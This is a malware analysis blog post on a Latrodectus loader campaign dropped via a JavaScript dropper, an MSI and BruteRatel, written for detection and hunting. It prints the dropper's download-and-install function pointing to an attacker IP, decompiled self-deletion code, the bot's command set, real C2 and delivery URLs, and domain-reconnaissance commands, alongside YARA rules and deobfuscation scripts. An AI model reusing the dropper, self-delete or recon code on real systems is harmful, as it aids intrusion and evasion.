+++
title = "Latrodectus dropped by BR4 🕷️"
author = ["pbo"]
description = """
  This article details the last campaign involving ****Latrodectus**** malware
  that is dropped by ****BruteRatel****, some YARA and hunting pivot are also
  provided.
  """
publishDate = 2024-08-01T00:00:00+02:00
tags = ["loader", "campaign", "yara"]
categories = ["RE"]
draft = false
+++

{{< figure src="/ox-hugo/latrodectus_heading.png" >}}


## Context {#context}

Starting point of the analysis is this [message on X from Zscaler](https://x.com/threatlabz/status/1804918852528357791?s=12&t=hSMYTeIkM3tFxVAaBrKjMg) published on <span class="timestamp-wrapper"><span class="timestamp">&lt;2024-06-24 Mon&gt;</span></span>.

<blockquote align="center" class="twitter-tweet"><p lang="en" dir="ltr">🕷️ The initial access broker using <a href="https://twitter.com/hashtag/Latrodectus?src=hash&amp;ref_src=twsrc%5Etfw">#Latrodectus</a> is back! The group has resurrected the malware loader less than a month after <a href="https://twitter.com/hashtag/OperationEndgame?src=hash&amp;ref_src=twsrc%5Etfw">#OperationEndgame</a>. <a href="https://twitter.com/hashtag/BruteRatel?src=hash&amp;ref_src=twsrc%5Etfw">#BruteRatel</a> is currently being used to drop Latrodectus.<br><br>Sample BruteRatel SHA256 hash:… <a href="https://t.co/maaz0OYfd3">pic.twitter.com/maaz0OYfd3</a></p>&mdash; Zscaler ThreatLabz (@Threatlabz) <a href="https://twitter.com/Threatlabz/status/1804918852528357791?ref_src=twsrc%5Etfw">June 23, 2024</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


## Stage 0 (Form_Ver-X-X-X.js) pivot {#stage-0--form-ver-x-x-x-dot-js--pivot}

Starting from the hash of ****BruteRatel**** we found the previous stage JavaScript file. That is overwhelm
of comments. A short JavaScript function is "_hidden_" in the comment, the function
is used to download and execute an MSI file using `ActiveXObject("WindowsInstaller.Installer")`.

```js
function installFromURL() {
    var msiPath;
    try {
        installer = new ActiveXObject("WindowsInstaller.Installer");
        installer.UILevel = 2;
        msiPath = "http:85.208.108.]63/BST.msi";
        installer.InstallProduct(msiPath);
    } catch (e) {

    }
}
installFromURL();
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 1:</span>
  Form_Ver-18-13-38.js cleaned
</div>

First pivot on the variable `installer` calling `InstallProduct` method:

You can use this YARA for instance:

```yaml
rule Latrodectus_JS_dropper {
  meta:
    purpose = "hunting"
    malware = "latrodectus"
    creation_date = "2024-06-25"
    description = "JS Dropper that DL and install a BR4 MSI"
    classification = "TLP:GREEN"
  strings:
    $s1 = "ActiveXObject"
    $s2 = "//////        installer.InstallProduct(msiPath);"
  condition: all of them
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 2:</span>
  YARA hunting rule for the JS dropper
</div>

&gt; [content:"ActiveXObject" content:"__//__        installer.InstallProduct(msiPath);"](https://www.virustotal.com/gui/search/content%253A%2522ActiveXObject%2522%2520content%253A%2522%252F%252F%252F%252F%252F%252F%2520%2520%2520%2520%2520%2520%2520%2520installer.InstallProduct(msiPath)%253B)

<details>
<summary>From the above hunting we get 25 JavaScript files:</summary>
<div class="details">

-   04086187681a0737f44284e2f715e3d90a7284157916cf1ece61cccc6d975227
-   073ed26f17f8efd735ad3f7737e88936f4bf2efd9722a37495874d6dd73ec12d
-   0a12f2ccd4dc561b924c3c88a9571a36fdd01acd12d5a3eca88d2336989fcb89
-   156c0afc01a5e346b95ebdb60cea9b7046ad7a61199cd63d6ad0f4ae32a576ac
-   1e2a94cb10157e71a550fd514c3d3607da6e1d2e3dc59b8aec2b175f8492b182
-   232ec24aa416bd642fdd2eb5d5eae2c72f2dd028b0f5058e193acb656e010f6d
-   23303910ff8d01d4d6e1499a627dfa6006793faf36766e0f1e7b9fdf15fb0715
-   2c63de7f491690900d95080d0741bb8282edfec74e58cdc25e7b9ba3a478e574
-   3af71ac2d92510f3300be025a4bf07069fb668da5fbd664431fc1a2d898a7765
-   51d30f6ac9da41e2124b765e74737fa43a6990657f8e57170cea8d59552ce806
-   5b51c052283b08f981cbab43a7c5fcfe740941317adc6c9d9352291dacfda5f0
-   71a429fdbaa04f8eee80c05b123ba00635569801ca041fdc7c6ac41de8aa72d3
-   921f90caf2fab16a171d850e1191f416774b0385b430cd71b4a0d98c270cc940
-   b023037cc1f1dc53d60cd574dbbb09ce1013ef4e299f793e14ad35407d3d5cc7
-   babfbd312f46e7deed15f68b4e3d4c6a6492bdcc596aaa946986537d3765b53e
-   bb9203ca1305e47a2ec1443a640efcd5e2c7d11223184639729673579e12967e
-   da305ed28c974ac82afc57ae365e9955b3237cde4659fb1922de4e72ed42f2b7
-   dc4317e2514603f94394c762b7e92a8a693689657641e190efeb2ed24c690525
-   e4919fd30fc8ad21a3798684bd9b6104907fa214251ffe6c34dc9ae849c7d1b1
-   e57990d251937c5e4b27bf2240a08da37a40399bd3faa75ed67616ac3935f843
-   f7382cb88fb68a4fb40c29fd991bd3b1f1933a264a45b4d336289a7e3891f13c
</div>
</details>

Retrieve all delivery C2:

```python
import os

urls = set()

for _, _, filenames in os.walk(path):
    for filename in filenames:
        with open(os.path.join(path, filename), "r") as f:
            raw_script = f.read()
        script = []
        for line in raw_script.split("\n"):
              if line.startswith("////"):
                  script.append(line.replace("////", ""))
                  if "msiPath = " in line:
                      urls.add(line.split(" = ")[-1].replace(";","").replace('"', ''))
return "\n".join(urls)
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 3:</span>
  python script to retrieve delivery URLs
</div>

```text
http://45.95.11.217/ad.msi
http://85.208.108.12/WSC.msi
http://85.208.108.63/BST.msi
http://146.19.106.236/neo.msi
http://193.32.177.192/vpn.msi
http://185.219.220.149/bim.msi
http://85.208.108.12/aes256.msi
```

<div class="table-caption">
  <span class="table-number">Table 1:</span>
  URL triage
</div>

| URL                               | State                                                                                           |
|-----------------------------------|-------------------------------------------------------------------------------------------------|
| `http://146.19.106.236/neo.msi`   | Down                                                                                            |
| `http://185.219.220.149/bim.msi`  | Down                                                                                            |
| `http://193.32.177.192/vpn.msi`   | UP <span class="timestamp-wrapper"><span class="timestamp">&lt;2024-06-24 Mon&gt;</span></span> |
| `http://45.95.11.217/ad.msi`      | DOWN                                                                                            |
| `http://85.208.108.12/WSC.msi`    | DOWN                                                                                            |
| `http://85.208.108.12/aes256.msi` | DOWN                                                                                            |
| `http://85.208.108.63/BST.msi`    | UP <span class="timestamp-wrapper"><span class="timestamp">&lt;2024-06-24 Mon&gt;</span></span> |


## Stage1: MSI {#stage1-msi}

Starting reverse from e57990d251937c5e4b27bf2240a08da37a40399bd3faa75ed67616ac3935f843
(****vpn.msi**** downloaded from `hxxp://193.32.]177.192/vpn.msi`)

The MSI install itself in the `AppData` directory and use a custom action to starts the
malicious DLL `aclui.dll` by calling the exported function `edit`.

{{< figure src="/ox-hugo/stage1_msi_customAction.png" caption="<span class=\"figure-number\">Figure 1: </span>MSI executing a DLL using rundll32" >}}

_N.B: `rundll32.exe aclui.dll, edit`, this is interesting to see a non standard DLL entrypoint `edit`_

The DLL is stored in the MSI in the Files segment, which made its extraction convenient with [MSIViewer](https://apps.microsoft.com/detail/9mztr9qs01gn?hl=en-us&gl=US).


## Stage 2 BruteRatel: aclui.dll {#stage-2-bruteratel-aclui-dot-dll}

SHA-256: c5dc5fd676ab5b877bc86f88485c29d9f74933f8e98a33bddc29f0f3acc5a5b9.
The DLL is executed using rundll32.exe on the export name ****edit****.

Using [unpac.me](https://www.unpac.me/results/6b96350a-d548-4ed8-821c-44f5a9ed4dfc) it detects a BruteRatel `c4_a0` sample and returns an
unpacked file that have this SHA-256 hash: 0d3fd08d237f2f22574edf6baf572fa3b15281170f4d14f98433ddeda9f1c5b2

This file is the first stage of BruteRatel which can again be unpack
on [unpac.me](https://www.unpac.me/results/7d5be08b-4636-401d-b204-95ca2ea3790e) with the SHA-256 hash: 77a8e883db7da0b905922f7babc79f1c1b78a521b0a31f6d13922bc0603da427

From the last stage of BruteRatel 77a8e883db7da0b905922f7babc79f1c1b78a521b0a31f6d13922bc0603da427 there is
some memory pattern that are related to Latrodectus (URL with `/live/`). However at the time of writing (<span class="timestamp-wrapper"><span class="timestamp">&lt;2024-06-25 Tue&gt;</span></span>)
all of the BR4 C2s are down therefore full infection leading to Latrodectus cannot be executed.
<mark>A comprehensive and interesting article on this Brute Ratel analysis, which complements the missing part of this article,
has been written by [@BlueEye46572843](https://twitter.com/BlueEye46572843). It was published around the same time and is available on the [ANY.RUN blog](https://any.run/cybersecurity-blog/brute-ratel-c4-analysis/?utm_source=twitter&utm_medium=post&utm_campaign=brc4latrodectus&utm_content=blog&utm_term=240724).</mark>


## Stage 3: Latrodectus sample analysis {#stage-3-latrodectus-sample-analysis}


### Overview {#overview}

As from the last stage of BR4 we cannot retrieve the Latrodectus DLL, we
start analysing a sample from the same campaign (JS-&gt;BR4-&gt;Latrodectus):
SHA-256: [d843d0016164e7ee6f56e65683985981fb14093ed79fde8e664b308a43ff4e79](https://bazaar.abuse.ch/sample/d843d0016164e7ee6f56e65683985981fb14093ed79fde8e664b308a43ff4e79/)

The DLL have 4 exported functions that point to the same address:

{{< figure src="/ox-hugo/exports.png" caption="<span class=\"figure-number\">Figure 2: </span>Latrodectus exported functions" >}}


### Dynamic API resolution {#dynamic-api-resolution}

Most of the dynamically imported functions are hashed using the CRC32 algorithm,
with only two functions hashed using a different algorithm.

The malware first dynamically resolves various DLLs: `kernel32.dll`, `Wininet.dll` and `ntdll.dll`.
Each DLL is resolved in a dedicated function, and for each function in the DLL, a structure
(`api`, see the definition below) is created and added to an array.
An entry in the `api_table` array has the following structure:

```C
struct api {
  DWORD funcHash;
  HMODULE* hModule;
  LPVOID*  pFunc;
};
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 4:</span>
  C structure of a api entry
</div>

{{< figure src="/ox-hugo/ntdll_resolution.png" caption="<span class=\"figure-number\">Figure 3: </span>NTDLL api resolution" >}}

The hash are stored in the "normal" representation (crc32), according to reveng.ai article the
code come from [BlackLotus](https://github.com/ldpreload/BlackLotus/blob/main/src/Shared/api.c?ref=blog.reveng.ai#L84) open source project.

Here is a capture of the function used to obtain the DLL base (`_LIST_ENTRY`) of the DLL to load:

{{< figure src="/ox-hugo/resolve_by_hash.png" caption="<span class=\"figure-number\">Figure 4: </span>DLL dynamic loading function" >}}


### string obfusatation {#string-obfusatation}

Latrodectus strings are obfuscated using a custom algorithm, each string is stored
under a particular structure which has the following shape:

```C
struct latrodectus_string {
  DWORD size;
  WORD seed;
  CHAR[] buff;
};
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 5:</span>
  Latrodectus string structure
</div>

<a id="code-snippet--Obfsucated string structure in memory"></a>
```ditaa
/--------------++--------------+----------------------\
|              |               |                      |
| cYEL Key     | cGRE Seed     | cBLU    Blob         |
|              |               |                      |
+--------------+---------------+----------------------+
:   4 bytes    :    2 bytes    : (key XOR seed) bytes |
\=-------------+=--------------+=---------------------/
```

{{< figure src="/ox-hugo/obfuscated-string-memory.png" caption="<span class=\"figure-number\">Figure 5: </span>Obfuscated string structure" >}}

The size of the obfsucated data is the result of a `XOR` operation between the key (4 bytes)
and the seed (2 bytes). The malware deobfsucates the string with the function below:

{{< figure src="/ox-hugo/string-obfuscation.png" caption="<span class=\"figure-number\">Figure 6: </span>Decompiled function used to deobfuscate Latrodectus string" >}}

Here is the Python script to deobfuscate strings:

```python
import struct

def deobfuscate_string(buff: bytes) -> str:
    key, seed = struct.unpack("<ih", buff[:6])
    size = (key ^ seed) & 0xFF
    ciphertext = buff[6 : 6 + size]
    cleartext = bytearray(size)

    for index in range(size):
        key += 1
        cleartext[index] = (key ^ ciphertext[index]) & 0xFF

    return cleartext.decode("utf-16")


buff = bytes.fromhex(
    "2082130E3C826222562456265328462A462C722E5A3041325734543643385C3A3B3C0000"
)

print(deobfuscate_string(buff))
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 6:</span>
  Python function to deobfuscate Latrodectus strings
</div>

```text
Custom_update 
```

<details>
<summary>Here is the IDA script to debofsucate the strings:

<i>Before running it, I needed to decompiled the all program <code>File&gt;Produce&gt;C file</code></i></summary>
<div class="details">

```python
import idautils
import struct


def deobufscate_string(buff: bytes) -> str:
    key, seed = struct.unpack("<ih", buff[:6])
    size = (key ^ seed) & 0xFF
    ciphertext = buff[6 : 6 + size]
    cleartext = bytearray(size)

    for index in range(size):
        key += 1
        cleartext[index] = (key ^ ciphertext[index]) & 0xFF

    return cleartext


def get_string_length(address):
    """
    Get the length of the string at the given address.

    :param address: The address of the string.
    :return: The length of the string.
    """
    string = idc.get_strlit_contents(address)
    if string:
        return len(string)
    return 0


def get_data_length(address: int) -> int:
    """
    Get the length of the data at the given address by analyzing the type.

    :param address: The address of the data.
    :return: The length of the data.
    """
    flags = idc.get_full_flags(address)
    if idc.is_strlit(flags):
        # It's a string
        return get_string_length(address)
    elif idc.is_data(flags):
        # It's some kind of data (e.g., array or structure)
        size = idc.get_item_size(address)
        return size
    return 0


deobfuscution_func_addr = 0x18000AE78 # CHANGE-ME
for ref in idautils.XrefsTo(deobfuscution_func_addr):
    for ea in idautils.Heads(ref.frm - 10, ref.frm):
        insn = idaapi.insn_t()
        length = idaapi.decode_insn(insn, ea)
        mnemonic = print_insn_mnem(ea)
        if mnemonic == "lea":
            operand_1 = print_operand(ea, 0)
            operand_2 = print_operand(ea, 1)
            addr = get_operand_value(ea, 1)
            size = get_data_length(addr)
            data = idc.get_bytes(addr, size)
            cleartext = ""
            try:
                cleartext = deobufscate_string(data)
                if cleartext.endswith(b"\x00" * 2): # wide detection...
                    cleartext = cleartext.decode("utf-16")
                else:
                    cleartext = cleartext.decode()
                print(f"set comment at 0x{ea:x} : `{cleartext}`")
                idc.set_cmt(ea, cleartext, 1)
            except Exception as er:
                print(er)
                if cleartext:
                    # idc.set_cmt(ref.frm, cleartext, 0)
                    print(f"need manual comment 0x{addr:x} {cleartext}")
                else:
                    print(f"error for : 0x{addr:x}")
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 7:</span>
  IDA Script for string deobfuscation
</div>
</div>
</details>

Additionally, the malware performs a series of ****environment detection checks****,
such as counting the running processes. Based on the ****OS version****, it determines a
threshold range within which the ****number of running processes**** is considered acceptable.
It also verify if the flag `IsDebugged` in the Process Environment Block is set in cased a debugger
would be attach to the process.

It also verifies that the ****MAC addresses**** of the various interfaces have a valid size.

Next, it computes a bot identifier from the volume serial number and then performs a series of
multiplications with a hardcoded constant `0x19660D`. (_which has
the same value of the RNG multiply of LCRNG algorithm, because why not..._).

{{< figure src="/ox-hugo/botid_string_format.png" caption="<span class=\"figure-number\">Figure 7: </span>botid string formating" >}}

A campaign or group identifier is also embedded in the obfuscated strings, this
value (deobfuscated) is hashed with FNV-1 algorithm. The current sample respond
to the group ID **Littlehw**


### Persistence {#persistence}

To persiste on the infected host, Latrodectus uses a scheduled task using COM base object.

&gt; [msdn logon trigger c++ example](https://learn.microsoft.com/en-us/windows/win32/taskschd/logon-trigger-example--c---)

The task is triggered on Logon event.

{{< figure src="/ox-hugo/scheduled-task.png" caption="<span class=\"figure-number\">Figure 8: </span>Function that create the scheduled task using COM object" >}}

Here is a way to build the CLSID from the hex data structure exported from the sample

```python
import struct

def bytes_to_clsid(byte_data):
    if len(byte_data) != 16:
        raise ValueError("A CLSID must be 16 bytes long")

    # Unpack bytes according to CLSID structure
    part1, part2, part3, part4_and_part5 = struct.unpack('<IHH8s', byte_data[:16])

    # Split part4_and_part5 into two parts
    part4 = part4_and_part5[:2]
    part5 = part4_and_part5[2:8]
    part6 = byte_data[8:16]

    # Format the CLSID
    clsid = f'{{{part1:08X}-{part2:04X}-{part3:04X}-{part4.hex().upper()}-{part5.hex().upper()}{part6.hex().upper()}}}'
    print(clsid)

# Example usage
byte_data = bytes.fromhex("C7A4AB2FA94D1340969720CC3FD40F85")
bytes_to_clsid(byte_data)
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 8:</span>
  Python function to format from hex representation the CLSID
</div>

```text
{2FABA4C7-4DA9-4013-9697-20CC3FD40F85969720CC3FD40F85}
```

This CLSID correspond to the ****TaskScheduler****, I made a script that gather various CLISD retrieved
from [wine](https://github.com/wine-mirror/wine/tree/master) project. More information on how to extract this CLSID in this [note](../../notes/python/#clsid-identifier) and the full script
is available [here](https://gitlab.com/lbpierre/lbpierre.gitlab.io/-/blob/master/resources/scripts/clsid-identifier.py?ref_type=heads).


### Defense evasion {#defense-evasion}

To hid itself, Latrodectus uses Alternate Data Stream as explain in [reveng.ai blogpost](https://blog.reveng.ai/latrodectus-distribution-via-brc4/)

{{% sidenote %}}
The code was borrowed from [byt3bl33d3r/OffensiveNim github repository](https://github.com/byt3bl33d3r/OffensiveNim/blob/c056dc876870ac385159e2dc2a234984807e3236/src/self_delete_bin.nim#L16).
{{% /sidenote %}}

<details>
<summary>reveng.ai citation</summary>
<div class="details">

Latrodectus makes use of a trick to delete itself while the process is still running,
making use of an ****alternative data stream**** (ADS) and a specific chain of API calls.
This technique is used by other malware such as ****RaspberryRobin****, ****HelloXD Ransomware****,
****DarkPower Ransomware****.
</div>
</details>

The C code used for the self delete is the following one:

```cpp
__int64 self_delete_withADS()
{
  char v1[8]; // [rsp+40h] [rbp-D8h] BYREF
  HANDLE FileW; // [rsp+48h] [rbp-D0h]
  int *buff; // [rsp+50h] [rbp-C8h]
  unsigned __int64 v4; // [rsp+58h] [rbp-C0h]
  unsigned __int64 buff_size; // [rsp+60h] [rbp-B8h]
  int *v6; // [rsp+68h] [rbp-B0h]
  __int16 *v7; // [rsp+70h] [rbp-A8h]
  WCHAR *__attribute__((__org_arrdim(0,0))) v8; // [rsp+78h] [rbp-A0h]
  __int16 a2[76]; // [rsp+80h] [rbp-98h] BYREF

  if ( !self_filepath )
    return 0xFFFFFFFFi64;
  FileW = CreateFileW(self_filepath, DELETE, 0, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64);
  if ( FileW == INVALID_HANDLE_VALUE )
    return 0xFFFFFFFFi64;
  deobfuscate_string(&byte_18000FA18, a2);      // :wtfbbq\x00
  v7 = a2;
  v8 = a2;
  v4 = 2i64 * whar::get_length(a2);
  buff_size = v4 + 24;
  buff = allocate_memory_rwx(v4 + 24);
  if ( !buff )
    return 0xFFFFFFFFi64;
  zero_mem_0(buff, buff_size);
  v6 = buff;
  buff[4] = v4;
  qmemcpy(v6 + 5, v8, v4);
  if ( SetFileInformationByHandle(FileW, FileRenameInfo, v6, buff_size) )
  {
    nt_free_mem(buff);
    CloseHandle(FileW);
    FileW = CreateFileW(self_filepath, DELETE, 0, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64);
    if ( FileW == INVALID_HANDLE_VALUE )
    {
      return 0xFFFFFFFFi64;
    }
    else
    {
      v1[0] = 0;
      zero_mem_0(v1, 1ui64);
      v1[0] = 1;
      if ( SetFileInformationByHandle(FileW, FileDispositionInfo, v1, 1u) )
      {
        CloseHandle(FileW);
        return 0i64;
      }
      else
      {
        return 0xFFFFFFFFi64;
      }
    }
  }
  else
  {
    nt_free_mem(buff);
    return 0xFFFFFFFFi64;
  }
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 9:</span>
  Self delete using Alternate Data Stream
</div>


### Command and Control Communication {#command-and-control-communication}

The malware uses this user-agent which is unique to this version (_or campaign_) of Latrodectus.
&gt; [behavior_network:"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)"](https://www.virustotal.com/gui/search/behavior_network%253A%2522Mozilla%252F4.0%2520(compatible%253B%2520MSIE%25207.0%253B%2520Windows%2520NT%25205.1%253B%2520Tob%25201.1)%2522)

The malware communicate over HTTPS where the POST data are ****base64**** encoded and its content is ****RC4
encrypted****. The RC4 key is stored obfuscated using the same obfuscation as other strings. In this
sample the key is `12345`...

The bot understands 4 orders: `URLS`, `CLEARURL`, `COMMAND` and `ERROR`. The list of command
is provided in the . The `URLS` updated the list of C2 URLs and `CLEARURL` cleaned the C2 URLs
table.

<a id="table--commandID"></a>

| Command ID | Description                                    |
|------------|------------------------------------------------|
| 2          | Get desktop files                              |
| 3          | List running processes                         |
| 4          | fingerprint host &amp; domain                  |
| 12         | Download and execute EXE in AppData            |
| 13         | Download and execute DLL in AppData            |
| 14         | Download and execute Shellcode                 |
| 15         | Download and update EXE (auto-update)          |
| 17         | Exit process                                   |
| 18         | Run DLL in AppData (`init -zzzz` files/bp.dat) |
| 19         | Increase beacon interval                       |
| 20         | Reset counter (number of sended http request)  |

Other analysis made on this threat highlight a command ID ****21**** related to a stealer module,
no reference to this ID have been found in this sample. My primary hypothesis is that stealer
capability is optional ¯\\_(ツ)\_/¯.

The bot beacon with its C2 with POST request where the body contains the following fields:

-   `counter`: number of http request send;
-   `type`: and id (1 to 5) defining which beacon it is (sysinfo, process list, desktop files);
-   `guid`: bot identifier;
-   `os`: major version;
-   `arch`: fixed to 1 for x64 architecture (otherwise the bot exit if it is another architecture);
-   `username`: username of the running process owner;
-   `group`: FNV-1 hash of the group (`Littlehw`);
-   `ver`: bot version;
-   `up`: a constante;
-   `direction`: C2 related information;

`counter=%d&type=%d&guid=%s&os=%d&arch=%d&username=%s&group=%lu&ver=%d.%d&up=%d&direction=%s`.

To facilitate the decryption of the communication, here is a script to help:

```python
import base64

def rc4(data: str, key: str) -> str:
    """code from OALabs """
    x = 0
    box = list(range(256))
    for i in range(256):
        x = (x + box[i] + key[i % len(key)]) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for c in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(c ^ box[(box[x] + box[y]) % 256])
    return bytes(out)


buff = b"E3l9I35LXiOWKYHilDWuJoUOTU3NOyjNGnp3muFUOrabzvFw6FpoOQqdBZmsUV5E7FzXWHKgBafR6PcPckBsIB2vIhb3CZ/QHPoEO1hc0A++PpLQjpRWJkK3EFDxH/R5RYjhInO8hc0jTljC91GMVstjkxgQnuZLGBW6AV/gz4VrNMWUxFUtP4fdg/HKCREbRm+gIHkH/7Jc9Q=="
key = b"12345"
print(rc4(base64.b64decode(buff), key).decode())
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 10:</span>
  Packet decryption routine
</div>

```text
CLEARURL
URLS|0|https://popfealt.one/live/
URLS|1|https://ginzbargatey.tech/live/
URLS|2|https://minndarespo.icu/live/
COMMAND|4|front://sysinfo.bin
```

_NB: the command: `4`, where it contains `front://` the bot replace the `front://` by the value_
_of the actual C2 URL._


### Host &amp; Domain recon {#host-and-domain-recon}

One of the capacity of the bot is to execute in a dedicated thread a serie of commands
to fingerprint the network topology of the infected host and on the connected domain:

-   `ipconfig /all`
-   `systeminfo`
-   `nltest /domain_trusts`
-   `net view /all /domain`
-   `nltest /domain_trusts /all_trusts`
-   `net view /all`
-   `net group "Domain Admins" /domain`
-   `/Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List`
-   `net config workstation`
-   `wmic.exe /node:localhost /names`
-   `whoami /groups`

_NB: This method is executed when the bot received the `COMMAND` order with the ID `0x4`, c.f: ._


### YARA {#yara}

```yaml
import "pe"

rule latrodectus_exports : TESTING {
    meta:
        version = "1.0"
        malware = "Latrodectus"
        author = "Sekoia.io"
        description = "detection based on the DLL exports, this is specific to the BR4 campaign"
        creation_date = "2024-07-03"
        classification = "TLP:GREEN"

    condition:
        (pe.exports("stow") or pe.exports("homq") or pe.exports("scub")) and pe.number_of_exports >= 3 and uint16(0) == 0x5a4d
}
```


### Artefacts hunting {#artefacts-hunting}

Host artefacts:

-   `%appdata%\Custom_update` directory with the files:
    -   `update_data.dat` (obfsucated C2 URLs);
    -   `Update_<8 random characters>.dll`.
-   Mutex `runnung`;
-   Scheduled task named `Updater`.

Network artefacts:

-   HTTP User-Agent: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)`;
-   HTTP POST request on `/live/` endpoints.


### Latrodectus Update {#latrodectus-update}

Previous version samples:

-   [9fad77b6c9968ccf160a20fee17c3ea0d944e91eda9a3ea937027618e2f9e54e](https://bazaar.abuse.ch/sample/9fad77b6c9968ccf160a20fee17c3ea0d944e91eda9a3ea937027618e2f9e54e/)
-   [9e7fdc17150409d594eeed12705788fbc74b5c7f482a64d121395df781820f46](https://bazaar.abuse.ch/sample/9e7fdc17150409d594eeed12705788fbc74b5c7f482a64d121395df781820f46/)
-   [53b0d542af077646bae5740f0b9423be9fb3c32e04623823e19f464c7290242f](https://bazaar.abuse.ch/sample/53b0d542af077646bae5740f0b9423be9fb3c32e04623823e19f464c7290242f/)


#### Strings obfuscation {#strings-obfuscation}

In the previous version of the malware, the string deobfuscation function used a more
sophisticated aglorithm ****PRNG2**** with have been removed in the current one...

The encoded strings always starts with `0xf5` byte due to the PRNG2 implementation:

{{< figure src="/ox-hugo/PRNG2_string.png" caption="<span class=\"figure-number\">Figure 9: </span>Example of obfsucated string in previous version" >}}

```C
BYTE *__fastcall decode_string(WORD *obfuscated_data, BYTE *buff_dest)
{
  BYTE v3; // [rsp+20h] [rbp-18h]
  unsigned __int16 i; // [rsp+24h] [rbp-14h]
  unsigned __int16 length; // [rsp+28h] [rbp-10h]
  int seed; // [rsp+2Ch] [rbp-Ch]
  BYTE *ptr_buff_obfuscated; // [rsp+40h] [rbp+8h]

  seed = *(_DWORD *)obfuscated_data;
  length = obfuscated_data[2] ^ *obfuscated_data;
  ptr_buff_obfuscated = (BYTE *)(obfuscated_data + 3);
  for ( i = 0; i < (int)length; ++i )
  {
    v3 = ptr_buff_obfuscated[i];
    seed = prng2(seed);
    buff_dest[i] = seed ^ v3;
  }
  return buff_dest;
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 11:</span>
  Previous version of the deobfuscation function
</div>

And the PRGN2 decompiled function was:

```C
__int64 __fastcall prng2(int seed)
{
  unsigned __int64 v1; // kr00_8
  unsigned int v3; // [rsp+8h] [rbp+8h]

  v1 = (unsigned __int64)(((((seed + 0x2E59) << 31) | ((unsigned int)(seed + 0x2E59) >> 1)) << 31) | ((((seed + 0x2E59) << 31) | ((unsigned int)(seed + 0x2E59) >> 1)) >> 1)) << 30;
  v3 = ((((unsigned int)v1 | HIDWORD(v1)) ^ 0x151D) >> 0x1E) | (4 * ((v1 | HIDWORD(v1)) ^ 0x151D));
  return (v3 >> 31) | (2 * v3);
}
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 12:</span>
  PRGN2 function oldest Latrodectus version
</div>

The medium article from _walmartglobaltech_ [IcedID gets Loaded](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) provided a Python
implementation of the PRGN2 algorithm:

```python
import struct
import binascii

def mask(a):
    return a & 0xFFFFFFFF


def prng2(seed):
    temp = mask((seed + 0x2E59))
    temp2 = temp >> 1
    temp = mask(temp << 0x1F)
    temp |= temp2
    temp2 = temp >> 1
    temp = mask(temp << 0x1F)
    temp |= temp2
    temp2 = temp >> 2
    temp = mask(temp << 0x1E)
    temp |= temp2
    temp ^= 0x6387
    temp ^= 0x769A
    temp2 = mask(temp << 2)
    temp >>= 0x1E
    temp |= temp2
    temp2 = mask(temp << 1)
    temp >>= 0x1F
    temp |= temp2
    return temp


def decode(s):
    (seed, l) = struct.unpack_from("<IH", s)
    l = (l ^ seed) & 0xFFFF
    if l > len(s):
        return b""
    temp = bytearray(s[6 : 6 + l])
    for i in range(l):
        seed = prng2(seed)
        temp[i] = (temp[i] ^ seed) & 0xFF
    return temp


string = binascii.unhexlify("F5788452F8781A6EEE4623114A578F9A44B3E10000")
print(decode(string).decode())
```
<div class="src-block-caption">
  <span class="src-block-number">Code Snippet 13:</span>
  Python implementation of Latrodectus PRGN2
</div>

```text
URLS|%d|%s
 
```

The strings obfuscation have been used by Latrodectus in its early version,
however the developper removed the ****PRNG2**** part and replace it with a
seed incrementation...


#### TTPs {#ttps}

According to [0x0d4 article](https://0x0d4y.blog/latrodectus-technical-analysis-of-the-new-icedid/) the infection chain got some update, however the campaign pattern
remain the same:

1.  _Stage 0_: A JavaScript Downloader is used to download a MSI from a first infrastructure;
2.  _Stage 0_: The JavaScript execute the MSI;
3.  _Stage 1_: The MSI uses a custom action to run rundll32.exe to execute the Latrodectus DLL;
4.  _Stage 2_: Latrodectus communicates with its own infrastructure;

{{< figure src="/ox-hugo/campaign_chain_old.png" caption="<span class=\"figure-number\">Figure 10: </span>Previous campaign infection chain" >}}

The last campaign introduce Brute Ratel usage between the MSI and Latrodectus DLL.y

{{< figure src="/ox-hugo/campaign_chain_recent.png" caption="<span class=\"figure-number\">Figure 11: </span>Recent campaign infection chain introducing Brute Ratel" >}}

In the May-June update, Latrodectus operators introduced a new stage between stages 1 and 2.
The threat actors use an MSI to execute BruteRatel, which then drops Latrodectus.
The primary hypothesis for the presence of BruteRatel is to detect and evade defenses
before dropping the Latrodectus payload. According to the analysis of the Latrodectus malware,
there is no advanced or effective sandbox, virtual, or analysis environment detection
implemented, hence the use of BruteRatel.


### Configuration extractor {#configuration-extractor}

The targeted configuration in the sample includes:

-   C2 URLs
-   RC4 key
-   Group (probably the affiliate name or campaign name)

All the "configuration" is obfuscated using the same technique as other strings in the malware.
The structure of the obfuscated string consists of a key (first 4 bytes) and
a seed (next 2 bytes), which are the same for all obfuscated strings.

To identify what will be called a `LATRODECTUS_OBFUSCATED_EGG` in the extractor,
we follow these steps:

1.  Extract the data from the `.data` section;
2.  Split the data as if it were a normal string using `data.split(b"\x00")`;
3.  Create a list containing the first 4 bytes of each split string;
4.  Use a Python `Counter` from the `collections` standard module to
    identify the starting buffer with the most occurrences;
